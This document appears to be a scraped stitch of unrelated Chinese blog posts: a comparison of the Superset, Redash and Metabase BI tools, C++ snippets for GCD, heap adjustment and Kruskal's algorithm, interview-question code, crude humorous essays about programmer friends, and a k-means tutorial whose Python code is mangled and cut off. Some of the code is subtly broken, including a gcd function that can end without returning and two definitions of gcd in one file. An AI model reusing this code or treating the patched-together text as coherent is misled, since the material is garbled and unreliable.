BI 工具，可惜太贵），一年半前把 Looker 上所有的 Dashboard 迁移到 Superset 上，整个过程也很顺利。用了一年多，虽然在不少小地方有些不满意，但总体来说 Superset 很好地满足了公司现阶段在数据可视化与业务报表方面的需求。当你把一个数据库连接到 Superset 上以后，你需要定义要用到的每一张表。Superset 里表的定义除了字段，还需要定义指标（Metric）。指标是对字段的某种统计结果，比如字段上值的求和、平均值、最大值、最小值等。是不是有点糊涂了？但请回想一下，BI 工具通常是用来做商业分析的。假想一个电商数据库，虽然在数据表我们存储每笔订单的交易额，但在商业分析时我们不关心单笔交易，我们关心的可能是一个时间段内的总交额，或是平均交易额。当你画月报表时，你不会把每笔交易画在图上，而是把每天的总交易额用一个柱形在图上表示。这就是为什么 Superset 要引入“指标”这个概念。对于数据分析人员来说，由于在 Superset 上他们不是直接写 SQL，而是通过选择指标（Metric）, 分组条件（Group）和过滤条件（Filter）来画图表，所以在构建复杂查询时可能会有些不适应。另一个难题是 Superset 里的表不支持 join，如果一个图表里的数据要从多个数据表里取，那只能通过建视图来实现。Superset 在 0.11 版本之后加入 SQL Lab 功能，支持从 SQL 查询结果直接生成图表。可惜，由于这个功能与 Superset 的核心设计格格不入，所以实现得比较粗糙，没什么实用价值。客观地讲，Superset 里引入自己的表与指标的概念，在逻辑上是合理的，在统一各种异型的数据源时也是必要的。但实际操作中仍会让人觉得有些麻烦，不够直接了当。Superset 在可视化方面做得很出色，不但是开源领域中的佼佼者，也把很多商用 BI 工具甩在身后。在 0.20 版本中支持的图表类型已经达到了 36 种，而且在选择图表类型时，你可以看到每一种图表的缩略图，下面这张截图大家可以感受一下Superset 的另一个亮点是可以在多个时间维度上观察，因为商业分析中的很多问题都是与时间密切相关的。Superset 有 4 种专门针对时间序列的图表，使用这些图表时，你需要指定一个字段为时间维度，之后就可以对时间维度做丰富的操作从不同时间粒度去查看你关心的指标（小时/日/周/月/季度/年）对时间序列做 rolling average，比如看一个指标的 7 日平均线可以对时间序列做偏移，再做对比，比如把本周的销售业绩与上周同期放在一张图表中对比不在图表上显示指标的绝对值，而是显示它随着时间变化的增长速度以上这些都是在数据分析中非常实用的功能。说完优点，再说说 Superset 的槽点，最大的槽点是当图表与报表多了以后，管理不方便。这个问题其实很好解决，只要在图表和报表管理时，加上分组或是文件夹的概念就可以了，但至今未见类似的功能。现在公司 900 多个图表都在一个大列表下，虽然 Superset 支持搜索，过滤或是收藏，但查找起来还是太麻烦。Superset 的文档也比较糟糕，虽然在安装与快速入门方面提供了很完整的文档，但在具体功能的介绍方面文档严重缺失。就算有些功能有文档，文档的结构也很混乱，所以大部分功能只能自己去尝试，好在这个工具本身并不难用，自己去摸索各个功能也不太困难。Redash如果说 Superset 是构建一个 BI 平台，那 Redash 目标就是更纯粹地做好数据查询结果的可视化。Redash 支持很多种数据源，除了最常用的 SQL 数据库，也支持 MongoDB, Elasticsearch, Google Spreadsheet 甚至是一个 JSON 文件。它不需要像 Superset 那样在创建图表前先定义表和指标，而是可以非常直观地将一个 SQL 查询的结果可视化，这使得它上手很简易。或者说 Redash 仅仅实现了 Superset 中 SQL Lab 的功能，但却把这个功能做到了极致。Redash 有两个非常实用的功能，Query Snippet 与 Query Parameters。Query Snippet 很好地解决了查询片段的复用问题。做数据报表时经常要用到十分复杂的 SQL 语句，这些语句中肯定有一些片段是可以在多个查询中复用的。在 Redash 中我们可以将这些片段定义成 Snippet，之后方便地复用。Query Parameters 可以为查询添加可定制参数，让这个图表变得更灵活。比如一个移动应用的日活指标，我可能有时要按 iOS/Android 切分，有时要按地域切分，或是按新老用户切分。在 Superset 的 Dashboard 上我要做三个表图。Redash 里我可以把查询的 groupby 做为一个参数，这样就可以在一张图上搞定。用的时候，运营人员可以在图表上方的一个下拉框里选择切分的方式，非常直观好用。如下图所示Redash 的 Dashboard 可以通过命名来进行分组，Dashboard 的名字可以有一个前缀并以冒号结尾，前缀相同的 Dashboard 就会自动被分为一组。例如“ Growth: Daily ”，“ Growth: Weekly ”这两个 Dashboard 都会被分到“ Growth ”组下。相比 Superset，Redash 在文档方面做得更好，除了快速入门教程以外，每一个功能模块都有文档且条理清晰。当然 Redash 也有自己的不足之处，它的可视化种类比 Superset 逊色不少（不过其实也够用了）。另外，由于它只是纯粹地把数据查询结果可视化，所以也没有 Superset 里那些对时间维度上的聚合与对比的操作。Metabase由于我并没有在生产环境下使用过 Metabase，只在自己本本上试用过这个工具。所以我只能说一下对它的第一印象。刚开始用的就觉得这个工具的界面好漂亮，明显是经过 UI 设计师仔细调校过的。相对的，Superset 与 Redash 一看就是程序员充当设计师的产物。用了一会儿之后，我觉得 Metabase 与 Superset 虽然都想要打造一个完整的BI平台，但在理念上是不同的。Metabase 非常注重非技术人员（如产品经理、市场运营人员）在使用这个工具时的体验，让他们能自由地探索数据，回答自己的问题。而在 Superset 或是 Redash 里，非技术人员基本上只能看预先建好的 Dashboard，不懂 SQL 或是数据库结构的他们，很难自己去摸索。我非常喜欢 Metabase 的理念，它更接近一款成熟的商业化产品。当然要把这个理念变为现实是很有挑战的，目前我不知道在面临复杂的真实业务环境中，Metabase 是否有想像中那样美好。另外值得一提的是，Metabase 的文档也是三个项目中写得最好最完整的，内容非常丰富。将来若是有机会，我很愿意更深入地去体验这个产品。小结本文简单地介绍了三个开源的数据可视化工具 Superset, Redash 和 Metabase，三者各有所长，我觉得并不存在绝对的最强者。对于刚刚开始搭建 BI 平台的公司，我相信它们都可以满足大部分报表与业务分析的需求。虽然 Superset 是我们公司现在主要使用的可视化工具，但我问过自己“如果现在让我重新选择，我会使用哪个开源项目？”我的答案是 Redash，原因主要不是功能层面，而是技术层面。这里正好可以引出我们下篇要聊的内容，从技术框架与源代码层面来比较一下这三个项目，以及我选择开源项目的一些通用原则，敬请期待！阅读原文







 
 
特点及意义
最大公约数指某几个整数共有因子中最大的一个。
GCD即Greatest Common Divisor.
例如，12和30的公约数有：1、2、3、6，其中6就是12和30的最大公约数。
两个整数的最大公约数主要有两种寻找方法：
* 两数各分解质因子，然后取出同样有的项乘起来
* 辗转相除法（扩展版）
和最小公倍数（lcm）的关系：gcd(a, b)×lcm(a, b) = ab
两个整数的最大公因子可用于计算两数的最小公倍数，或分数化简成最简分数。
两个整数的最大公因子和最小公倍数中存在分配律：
* gcd(a, lcm(b, c)) = lcm(gcd(a, b), gcd(a, c))
* lcm(a, gcd(b, c)) = gcd(lcm(a, b), lcm(a, c))
在坐标里，将点(0, 0)和(a, b)连起来，通过整数坐标的点的数目（除了(0, 0)一点之外）就是gcd(a, b)。
gcd递归定理及证明
gcd递归定理是指gcd(a,b)=gcd(b,a%b),其中%表示取余数。
证明如下：
我们只需证明gcd(a,b)和gcd(b,a%b)可以互相整除即可。
对于gcd(a,b)，它是a和b的线性组合中的最小正元素，gcd(b,a%b) 是b与a%b的一个线性组合，而a%b是a与b的一个线性组合，因而gcd(b,a%b)是一个a与b的线性组合，因为a,b都能被gcd(a,b)整除，因而任何一个a与b的线性组合都能被gcd(a,b)整除，所以gcd(b,a%b)能被gcd(a,b)整除。反之亦然。
 
// gcd.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
 
int gcd(int a ,int b)
{
	int c = 0;
	if (a < b)
	{
		c = a ;a = b; b= c;//把大的元素放在前面
	}


	for (;a - b >= 0 ;b = a - b,a = c)
	{
		if (a % b == 0)
		{
			return b;
		}
		c = b;

	}


}

unsigned int gcd(unsigned int a,unsigned int b)
{
	int r;
	while(b>0)
	{
		r=a%b;
		a=b;
		b=r;
	}
	return a;
}
unsigned int gcd1(unsigned int a,unsigned int b)
{
	while(b^=a^=b^=a%=b);
	return a;
}

unsigned int gcd2(unsigned int a,unsigned int b)
{
	return (b>0)?gcd(b,a%b):a;
}
int _tmain(int argc, _TCHAR* argv[])
{
	int b = gcd(4,12);
	return 0;
}








 
代码来源：
 
http://blog.csdn.net/v_JULY_v
 
调整堆为小顶堆的代码片：基本思想就是把孩子节点中大的一个跟父节点交换
void HeapAdjust(int array[], int i, int Length)
{
	int child, temp;
	for (temp = array[i]; 2*i + 1 <Length; i = child)
	{
		 child = 2*i +1;
		 if (child < Length - 1 && array[child +1] < array[child])
		 {
 			 child++;
		 }

		 if (temp > array[child])
		 {
			 array[i] = array[child];
		 }
		 else
			 break;

		 array[child] = temp;
	}
}
 
 
一般来说，进行初始化建立堆的时候，需要对数组的一般进行调整，调用代码：
 
只需要用一般的数进行调整，就能保证小顶堆的建立。
for (int i = Length/2 - 1;i >= 0; --i)
	{//初试建堆，时间复杂度为o（n）
		HeapAdjust(array,i,Length);
	}


 
下面是交互两个数的代码片：使用三次异或操作：
void Swap(int *a, int *b)
{
	//异或预算用来交互两个数
	*a = *a^*b;
	*b = *a^*b;
	*a = *a^*b;
}


 







#include<iostream>
#include<stdlib.h>//产生随机数组用
#include<time.h> //同上

using namespace std;


class MyArc
{
public:
    int m_beginVex;
    int m_endVex;
    int m_weight;
    MyArc(int beginVex,int endVex,int weight);
    MyArc(){}
    bool operator < (const MyArc& arc)
    {
        return m_weight<arc.m_weight;
    }
    bool operator == (const MyArc& arc)
    {
        return m_weight==arc.m_weight;
    }
    bool operator > (const MyArc& arc)
    {
        return m_weight>arc.m_weight;
    }
};

MyArc::MyArc(int beginVex,int endVex,int weight):m_beginVex(beginVex),m_endVex(endVex),m_weight(weight)
{

}

class Graph
{
public:
    int m_vexnum;//顶点数
    int m_arcnum;//弧数目
    int *m_pmatrix;
public:
    ~Graph();
    Graph(int vexnum);
    Graph(int vexnum,int *pmatrix);
    void insert(MyArc arc);//按权值大小排序插入
    bool bound(int x);   //判断顶点x是否已与其它顶点连通

};

//构造函数
Graph::Graph(int vexnum)
{
    m_pmatrix=new int[vexnum*vexnum];
    m_vexnum=vexnum;
    m_arcnum=0;
    for(int i=0;i<vexnum*vexnum;++i)
    {
        m_pmatrix[i]=0; //初始化邻接矩阵
    }


}

//构造函数
Graph::Graph(int vexnum,int *pmatrix)
{
    m_vexnum=vexnum;
    // m_arcnum=arcnum;
    m_pmatrix=new int[m_vexnum*m_vexnum];
    for(int i=0;i<m_vexnum*m_vexnum;++i)
    {
        m_pmatrix[i]=pmatrix[i];
    }
}

//测试 顶点x是否已与其他点连通
bool Graph::bound(int x)
{
    for(int i=0;i<m_vexnum;++i) if(m_pmatrix[x+i*m_vexnum]!=0) return true;
    return false;
}

//在邻接表中连通 arc表示的边，并且设置权
void Graph::insert(MyArc arc)
{
    m_pmatrix[arc.m_beginVex*m_vexnum+arc.m_endVex]=arc.m_weight;
    m_pmatrix[arc.m_endVex*m_vexnum+arc.m_beginVex]=arc.m_weight;
    ++m_arcnum;
}
//析构
Graph::~Graph()
{
    delete[] m_pmatrix;
    m_pmatrix = NULL;
}

class MyQueues
{
public:
    list<MyArc> m_list;
    MyQueues(){}
    void insert(const MyArc& arc);//边按权值插入队列中合适位置,
    void InsertGraph(const Graph &graph);//将图的连通分量插入队列
    MyArc pop();
};
//边出队
MyArc MyQueues::pop()
{
    MyArc arc=m_list.front();
    m_list.pop_front();
    return arc;
}
//边按权值插入队列中合适位置,
void MyQueues::insert(const MyArc& arc)
{
    list<MyArc>::iterator pos=m_list.begin();
    while(pos!=m_list.end())
    {
        if(*pos>arc) break;
        else
            ++pos;
    }
    m_list.insert(pos,arc);
}
//将图的连通分量插入队列
void MyQueues::InsertGraph(const Graph &graph)
{
    for(int i=0;i<graph.m_vexnum;++i)
    {
        for(int j=i+1;j<graph.m_vexnum;++j)//上三角矩阵的联通分量
              {
                if(graph.m_pmatrix[i*graph.m_vexnum+j])
                    insert(MyArc(i,j,graph.m_pmatrix[i*graph.m_vexnum+j]));
              }
    }
}
//用随机数组初始化matrix数组并且打印
void SetMatrix(int vexnum,int *pmatrix)
{
    srand((unsigned)time(NULL));
    for(int i=0;i<vexnum;++i)//产生随机权值矩阵
    {
        for(int j=i;j<vexnum;++j)
        {
              if(j==i)
              {
                  pmatrix[i*vexnum+j]=0;
                  continue;
              }
              int rnum=rand();
              rnum%=99;
              rnum++;//产生1~99的随机整数作为边的权值
              pmatrix[i*vexnum+j]=rnum;//先填写上三角矩阵
              pmatrix[j*vexnum+i]=rnum;//后填写下三角矩阵
        }
    }
    cout<<"***随机产生的各边权值矩阵 [顶点数为 "<<vexnum<<"] ****\n";
  for(int i=0;i<vexnum;++i)//输出随机权值矩阵
    {
        for(int j=0;j<vexnum;++j)
        {
              cout<<pmatrix[i*vexnum+j]<<"\t";
        }
        cout<<endl;
    }

}


//判断连通边arc后 图graph 是否存在回路
bool IsCycle(Graph& graph, MyArc& arc)
{
    list<int> mylist;
    mylist.push_back(arc.m_beginVex);
    int *ps=new int[graph.m_vexnum];
    for(int i=0;i<graph.m_vexnum;++i)
        ps[i]=0;
    while(!mylist.empty())
    {
        int x=mylist.front();
        ps[x]=1;
        mylist.pop_front();
        for(int i=0;i<graph.m_vexnum;++i)
        {
              if(graph.m_pmatrix[i+x*graph.m_vexnum]!=0)
              {
                  if(i==arc.m_endVex) return true;
                  if(ps[i]!=1) mylist.push_back(i);
              }
        }
    }
    delete[] ps;
    return false;//遍历完成没有环
}

//克鲁斯卡尔算法
void kruskal(const Graph& graph,Graph& smtree)
{
    MyQueues arcqueues;//保存从小到大排列的边
    arcqueues.InsertGraph(graph);
    MyArc myarc;//Arc表示边的类型
    int arcnum=0; //边的个数
    while(arcnum<graph.m_vexnum-1)//此处的含义为边的数目正好为顶点数目减一，注意与prim算法表达式相同但是含义不同
    {
        myarc=arcqueues.pop();
        if(!IsCycle(smtree,myarc))
        {
              smtree.insert(myarc);
              ++arcnum;
        }
    }
}

//输出最小生成树
void SmallestTreeOutput(const Graph& smtree)
{
    cout<<"最小生成树:"<<endl;
    for(int i=0;i<smtree.m_vexnum;++i)//输出最小树
        for(int j=i+1;j<smtree.m_vexnum;++j)
              if(smtree.m_pmatrix[i*smtree.m_vexnum+j])
                  cout<<'('<<i<<','<<j<<','<<smtree.m_pmatrix[i*smtree.m_vexnum+j]<<')'<<endl;
}


/*
主函数
*/

int main()
{
    int i;
    cout<<"请输入顶点数目:";
    cin>>i;
    int vex=i;
    int *matrix=new int[vex*vex];
    cout<<endl;
    SetMatrix(vex,matrix);
    Graph graph(vex,matrix),smtree(vex);
    kruskal(graph,smtree);
    SmallestTreeOutput(smtree);
    delete []matrix;
}







 






持续更新中。。。



1.编程界牛人太多了，还是要好好a题，好好弄清楚基础算法，并且用代码实现

2.c/c++方向其实来回来去那么几道题，做好了记到脑子里。


下面就是我打算把不会的，不清楚的都贴上来然后好好解析做一下：


1


2

3









4



360还有一个题挺难的，下面是bbs 的解法：


5



输出结果：




// jingdongtest.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>
using namespace std;

int getHigh(int x)
{
	int result  = x;
	while(x>0)
	{
		x = x/2;
	result = x*2 + result;
	
	}

	return result;
}


class MyClass
{
public:
	MyClass(int i = 0)
	{
		cout<<i;
	}
	MyClass(const MyClass &x)
	{
		cout<<2;
	}
	MyClass& operator=(const MyClass &x)
	{//断点都不能打进来，说明输出没用
		cout<<3;
		return *this;
	}
	~MyClass()
	{
		cout<<4;
	}
};

class ClassA
{
	friend double func(const ClassA & obj1,const ClassA& obj2)
	{
		double da = obj1.i_ - obj2.i_;
		double db = obj1.j_ - obj2.j_;
		return (da*da + db*db);
	}
public:
	ClassA(int i,int j):i_(i),j_(j){}
protected:
private:
	int i_;
	int j_;
};


int _tmain(int argc, _TCHAR* argv[])
{
/*
	int x = 0;
	int result = 0;
	

	while(cin>>x)
	{
		result = result + getHigh(x);
		cout<<result<<endl;
	}
	
	cout<<x<<endl;*/

	struct  
	{
		union
		{
			char a;
			int b;
			int c;
		};
		/*union
		{
	     char r;
		 char o;
		};*/
		
		int e;
		char q;
		char w;
		
	} a;

	int x = sizeof(a);

	//int yichu = -1;
	//unsigned int feifu = yichu;
	//cout<<feifu;

	MyClass obj1(1),obj2(2);
	MyClass obj3 = obj1;



	ClassA obj11(1,2);
	ClassA obj21(3,4);
	cout<< func(obj11,obj21)<<endl;
	return 0;
}















这个是西安一个小公司机器学习的题目：









﻿﻿









1.《老王和他的IT界朋友》能给我们带来什么
最近的心路历程非常之多，每次到了每年的这个时候，我总喜欢停下来，好好写写东西，感觉越来越力不从心。看到之前写的东西，总是很惊讶那样的文字也会出自我手。
最近姥爷有点身体不适，我推着他跑了跑医院，这才知道我们每个人其实都不是自己所想象的那样，并不是自己所想象的那样健康，我想做一个公众号，或者说一个订阅号，默默的记录我们身边的IT界人的心路历程，希望透过我们并不是很幼稚的文字记录自己的成长，同时给予其他看到这些文字的人 ，看到这些文字的攻城狮，程序员、媛群体更多的人文关怀。
下面是几年以来我写的小段子，有时间还希望大家伙细细读读，说不定会看到我们每个人的影子。希望这些文字能让世界变的更好，即使仅仅是在键盘前，即使仅仅是在手机前。同样这也是我做这个微信订阅号的目的，希望大家多多关注啦。










2.几个草根程序员

雷总简介：
android高程，精通java，jsp和所有j打头的语言，经验丰富，能够独立完成app从概要设计到后期调试维护的所有工作，上至带项目、出方案，下至盗账号、睡PM啥都能干，代码风骚，效率恐怖！国立西安大学金牌摇妹子专家！著有《android大全》《放荡不羁的那些年》《我的32块腹肌》《21天精通摇妹子》《不要在意那些细节》另有三本出版图书根据相关政策与法规未能予以显示。

雷总说他在原来的公司呆久了，想要去北上广闯一闯，所以有一次，叫我跟湿胸出来吃饭。中途掏出来一根Pregnancy Test Kit说是晚上叫学妹Test一下，他还说只有经历过这种事情男人才能真正的成长起来，我跟湿胸对于雷总的教导总是深信不疑。那顿饭我们吃的很饱，分别的时候，雷哥突然把他的公家卡塞给了我，他说他再也用不上了，我知道不久以后，他也要离开了，世间的事大抵如此，这样的故事每年都发生在这城市之中，后来可能因为两道杠的检测结果耽搁了雷总的计划，他还留在这座城里，并且时不时的告诉我们，有女朋友的都抱紧了啊，老衲要开始摇微信了！

湿胸简介：
高程，各种牛。C/C++、Java、Php无不精通，熟练掌握各种框架。可连续编程100小时不休息，讨论技术方案5小时不喝水。技术宅，接私活，专业维修核潜艇，回收二手航母、二手航天飞机，大修核反应堆，拆洗导弹发动机更换机油，无人侦察机手动挡改自动，航天飞机保养换三滤。量大从优，团购7折，秒杀5折，根据国家三包规定7天包退、15天包换、一年保修，有正规发票！ 信誉第一
我们口号是：有困难？找湿胸！
项目经历：
联合国保密项目：国际空间站电池板清洗，国家973项目：长城全线瓷砖镶嵌。
著有《model-checking》《量子计算机导论》《网络安全系统白皮书》《程序员的自我修养系列之如何变得更加猥琐》《楠哥教你把学长！》《楠哥教你把学弟！》《我和学姐同居的日子》

很多年了湿胸这个技术宅还是比较喜欢吃窝边草，这是一个好习惯。经常可以从他这里了解到一些前沿的东西。还有几天几夜不睡垒程序的能力总是叫人印象深刻。码程序的人都喜欢抽烟，湿胸也不例外，他跟雷总抽烟就好像跟销魂的女人滚床单一般叫人看着都欲罢不能，我也试着滚过几次，可是这个女人感觉一般，我也没有再留恋她。湿胸毕业的时候算是那一届的传奇人物了，他拿了BAT的offer最后去了一个神秘的事业单位，现在结婚生娃也都当爹了，也算是人生赢家，祝福湿胸生活美满幸福。

征婚：
艺名：龙哥，男，NEC基层架构湿，软件工程专家，身体强壮、健步如飞。
热爱公益，日行一善。酷爱学霸型女生。经济适用型居家好男人
著有正能量系列图书：
《我在NEC干死小日本》 《如何每天都像打了鸡血一样充满正能量》《心灵鸡汤365天（已经在微信上连载了很久，深受各位朋友喜爱，每天至少收获一个赞！）》《凌晨四点的肯德基》
电话：+861361929147*
非诚勿扰！

跟龙哥混了这么多年，真心觉的龙哥厉害，心灵鸡汤不说，什么出淤泥而不染，濯清涟而不妖，这货根本就没进过淤泥就更别提湿鞋了。 比如在找妹子这个问题上龙哥就经常批评我只注重身材低级趣味。
龙哥是个超人，你听说过凌晨四点的肯德基么，没有！
龙哥凌晨两点睡觉，三点起床在西安外三环骑自行车180迈彪一圈，完后去肯德基喝一杯雪顶咖啡（注意是：雪顶咖啡，不是大姨妈圣代！），五点到文理开始热身，六点跟我们开始打球一直到中午，下午跟我们去游泳，我们都游到腿抽筋了，他还在泳池里乐此不疲的喝水。
（有次我拉龙哥去另一个泳池游泳，龙哥摇摇头，告诉我说，这里的水不好喝。。。）
后来晚上龙哥非拉我们去ktv，大家都没劲了，他手持麦克风对天嘶吼着：我真的还想再活五百年~~~第二天凌晨四点的肯德基，龙哥依旧出现在靠窗边的位置喝雪顶咖啡，望着窗外若有所思。周末总是过的很快，疯狂过去，生活归于平淡。

帝都还混迹了几个人，距离远了也不知道是否安好，多子宅估计祥龙也宅，听说宁哥也在还一天一条说说发的不亦乐乎，这样挺好，至少我知道你们still alive。突然在这临近毕业的日子里想起宁哥还有一条警句，静静的躺在261下铺的墙上，青年对明天的失望是对青春的背叛----卡夫卡，它还在那里继续诉说着睡在我下铺兄弟的过往。
还有一些哥们，经常毫无征兆的在空间里莫名其妙的诈诈尸。。。
生活总是充满惊喜，世间的事大抵如此。

作者简介：
老王，笔名，王大力，曾用名：流川枫，仙道彰，帅的惊动党中央，万千学姐伤我心，万千学妹伤我心等。英文名：season，shiter。
90后，篮球手，砖业运动员，草根程序员，复制粘贴砖家，调试程序砖家。
基层党务工作者，一贯秉持“毫不利人，专门利己，全心全意为人民服务。。。（此处省略2万字。。）”的工作原则，热爱祖国，拥护党的领导。
著有《学妹二三事》《那些年摇过的学姐》《被学妹抛弃后如何保持冷静》《女教授办公室的日子》等畅销书深受广大读者喜爱。
专业方向：XX动作片去除马赛克，添加马赛克，各种马赛克相关。三围重建，牙刷轮廓识别。。。
详情咨询：+86****
上面这些草根程序员告诉我们，其实我们每个程序员都是与众不懂的，我们都在用不同的语言java，c，python，然而我们又都是相同的，因为最终我们都在用一样的语言——二进制，我们终将会用简单的0，1去将自己的人生书写的更加美好。我们的千差万别构成了软件世界的参差多态，这，正是现在世界变的越加美好的原因，因为你我，因为这些草根程序员！

3.理想，与不忘初心！
最近高考刚刚结束，我想起之前在师大招办做本科生招生，现场咨询的时候，家长们渴望又无助的眼神，饿虎扑食一般的抢夺招生资料，深深感染了我，我终于明白自己当时的分数给父母带来了多大的失落。我终于明白五百七八十分面对各个学校那么多专业那么多选择有多么茫然。好在当年一本有清华，二本有文理她们都不曾嫌弃过我，虽然我的分数离第一志愿就差200多分。其实说那么多也没什么用，好在大家都殊途同归，躺在吴家坟女子专修学院里安度晚年。
招生时候还有个奇遇，早上刚开始咨询，就有个小姑娘就坐在我们身边静静的听着，完后还怕我热，给我扇风，结果一发不可收拾从早扇到晚，期间默默的跟着我们蹭了两顿饭。据说她今年17，我掐指一算想起了《未成年人保护法》，我也是有身份证的人，然后就没有然后了。（后来学妹发短信告诉我她考了600分，真是厉害）
这么些天我有个感觉，我国的高中教育跟高等教育存在严重的脱节情况，高中没有很好的培养孩子们对各个专业的认识，高考完了两眼一抹黑的突然抛出来几百个专业，对没参与与过高等教育的学生和家长未免过于残忍了。
招生咨询的日子，有不少很有意思的家长，小心谨慎的问东问西。有个家长带着女儿天天往招办跑，同事们耐心细致的解答了他很多问题，他还是不放心，碰巧有次我急着喝水，他又来问我:
老师你说！金融到底是学啥我实在是搞不明白！？
算账！
那电子信息技术呢？
通信！
计算机科学与技术？
写代码！
电子商务？
卖东西。。。
完后这位家长拍了了拍我的肩膀，露出手上的劳力士说，我问了这么多人，小伙子就你说的清楚，你贵姓？以后我女儿就交给你了！方便留个电话不？
对不起，不行！！！哈哈哈
招生结束碰见研究生阶段最后一门英语考试，上了考场管他会与不会酣畅淋漓的写完正好交卷， 现在油盐不进刀枪不入碰见考试也根本没有什么特殊的感觉，生活每天其实都在考试，中考高考考研总有人哄骗说人生决定论，其实每天所做的事情都在改变自己的人生，hard work pays off，世间的事大抵如此。
记得今年早些时候开运动会，有个小姑娘带着收音机，在操场边闭着眼睛忘我的演唱，《你是我的眼》。我跟飞哥不能抵抗如此入戏的萝莉放下老脸上前要求了一张合影，人生又完整了。
她忽然就提醒了我，生活里面需要自我陶醉，即使长大了，也一样。
安西教练有一句话，心死了比赛也就结束了，年龄见长，见识了各式各样的理想磨灭。我作为反面典型, 让多少人重获自信, 找到活下去的理由, 总而言之, 我对社会的贡献是大大的。这时候，我还能说，那家伙还没有丧失斗志。
红旗h7的广告词写的好：
我来自一个理想飞扬的年代。理想如同一面旗帜，在每个人心中飘扬。沿着理想这条路，我走了很多年。不管时代如何变迁，理想的动力从未改变。只要心中的旗帜始终飘扬，我就能忠于理想的方向，勇往前行。红旗，让理想飞扬。
我最后再补充一句：
青年，要永远忠于自己年轻时候的梦想！
鼓掌，散会！！！

p.s. 现如今时代要求大家不忘初心，初心是什么，年轻时候的梦想是什么你们还记得么？
小时候我非常喜欢吃kfc的炸鸡翅，喜欢到会把骨头都剃干净，梦想有一天能够天天吃肯德基。现在一个人坐那地方吃个十翅一桶，觉得非常满足。
你说，我是不是不忘初心呢？
提醒我们夏天不要忘了喷花露水的人：








       机器学习算法与Python实践这个系列主要是参考《机器学习实战》这本书。因为自己想学习Python，然后也想对一些机器学习算法加深下了解，所以就想通过Python来实现几个比较常用的机器学习算法。恰好遇见这本同样定位的书籍，所以就参考这本书的过程来学习了。
       机器学习中有两类的大问题，一个是分类，一个是聚类。分类是根据一些给定的已知类别标号的样本，训练某种学习机器，使它能够对未知类别的样本进行分类。这属于supervised learning（监督学习）。而聚类指事先并不知道任何样本的类别标号，希望通过某种算法来把一组未知类别的样本划分成若干类别，这在机器学习中被称作 unsupervised learning （无监督学习）。在本文中，我们关注其中一个比较简单的聚类算法：k-means算法。

一、k-means算法
       通常，人们根据样本间的某种距离或者相似性来定义聚类，即把相似的（或距离近的）样本聚为同一类，而把不相似的（或距离远的）样本归在其他类。
       我们以一个二维的例子来说明下聚类的目的。如下图左所示，假设我们的n个样本点分布在图中所示的二维空间。从数据点的大致形状可以看出它们大致聚为三个cluster，其中两个紧凑一些，剩下那个松散一些。我们的目的是为这些数据分组，以便能区分出属于不同的簇的数据，如果按照分组给它们标上不同的颜色，就是像下图右边的图那样：

       如果人可以看到像上图那样的数据分布，就可以轻松进行聚类。但我们怎么教会计算机按照我们的思维去做同样的事情呢？这里就介绍个集简单和经典于一身的k-means算法。
       k-means算法是一种很常见的聚类算法，它的基本思想是：通过迭代寻找k个聚类的一种划分方案，使得用这k个聚类的均值来代表相应各类样本时所得的总体误差最小。
       k-means算法的基础是最小误差平方和准则。其代价函数是：

       式中，μc(i)表示第i个聚类的均值。我们希望代价函数最小，直观的来说，各类内的样本越相似，其与该类均值间的误差平方越小，对所有类所得到的误差平方求和，即可验证分为k类时，各聚类是否是最优的。
      上式的代价函数无法用解析的方法最小化，只能有迭代的方法。k-means算法是将样本聚类成 k个簇（cluster），其中k是用户给定的，其求解过程非常直观简单，具体算法描述如下：
1、随机选取 k个聚类质心点

2、重复下面过程直到收敛  {
      对于每一个样例 i，计算其应该属于的类：

      对于每一个类 j，重新计算该类的质心：

}
      下图展示了对n个样本点进行K-means聚类的效果，这里k取2。

其伪代码如下：
********************************************************************
创建k个点作为初始的质心点（随机选择）
当任意一个点的簇分配结果发生改变时
       对数据集中的每一个数据点
              对每一个质心
                     计算质心与数据点的距离
              将数据点分配到距离最近的簇
       对每一个簇，计算簇中所有点的均值，并将均值作为质心
********************************************************************

二、Python实现
      我使用的Python是2.7.5版本的。附加的库有Numpy和Matplotlib。具体的安装和配置见前面的博文。在代码中已经有了比较详细的注释了。不知道有没有错误的地方，如果有，还望大家指正（每次的运行结果都有可能不同）。里面我写了个可视化结果的函数，但只能在二维的数据上面使用。直接贴代码：
kmeans.py



[python] 
view plaincopyprint?

################################################# 
# kmeans: k-means cluster  # Author : zouxy  
# Date   : 2013-12-25  # HomePage : http://blog.csdn.net/zouxy09 
# Email  : zouxy09@qq.com  ################################################# 
  from numpy import * 
import time  import matplotlib.pyplot as plt 
    # calculate Euclidean distance  
def euclDistance(vector1, vector2): 
    return sqrt(sum(power(vector2 - vector1,
2)))    # init centroids with random samples 
def initCentroids(dataSet, k): 
    numSamples, dim = dataSet.shape      centroids = zeros((k, dim))      for i in range(k): 
        index = int(random.uniform(0, numSamples)) 
        centroids[i, :] = dataSet[index, :]      return centroids  
  # k-means cluster  
def kmeans(dataSet, k):      numSamples = dataSet.shape[0] 
    # first column stores which cluster this sample belongs to, 
    # second column stores the error between this sample and its centroid 
    clusterAssment = mat(zeros((numSamples, 2))) 
    clusterChanged = True 
      ## step 1: init centroids 
    centroids = initCentroids(dataSet, k)        while clusterChanged:          clusterChanged = False 
        ## for each sample          for i in xrange(numSamples): 
            minDist  = 100000.0  
            minIndex = 0 
            ## for each centroid  
            ## step 2: find the centroid who is closest 
            for j in range(k): 
                distance = euclDistance(centroids[j, :], dataSet[i, :]) 
                if distance < minDist: 
                    minDist  = distance                      minIndex = j                            ## step 3: update its cluster 
            if clusterAssment[i,
0] != minIndex:                  clusterChanged = True 
                clusterAssment[i, :] = minIndex, minDist**2 
          ## step 4: update centroids 
        for j in range(k): 
            pointsInCluster = dataSet[nonzero(clusterAssment[:,
0].A == j)[0]] 
            centroids[j, :] = mean(pointsInCluster, axis = 
0)        print 'Congratulations, cluster complete!' 
    return centroids, clusterAssment 
  # show your cluster only available with 2-D data 
def showCluster(dataSet, k, centroids, clusterAssment): 
    numSamples, dim = dataSet.shape      if dim != 2: 
        print "Sorry! I can not draw because the dimension of your data is not 2!" 
        return 1 
      mark = ['or', 'ob',
'og', 'ok',
'^r', '+r',
'sr', 'dr',
'<r', 'pr'] 
    if k > len(mark):  
        print "Sorry! Your k is too large! please contact Zouxy" 
        return 1 
      # draw all samples  
    for i in xrange(numSamples): 
        markIndex = int(clusterAssment[i, 
0])          plt.plot(dataSet[i, 0], dataSet[i,
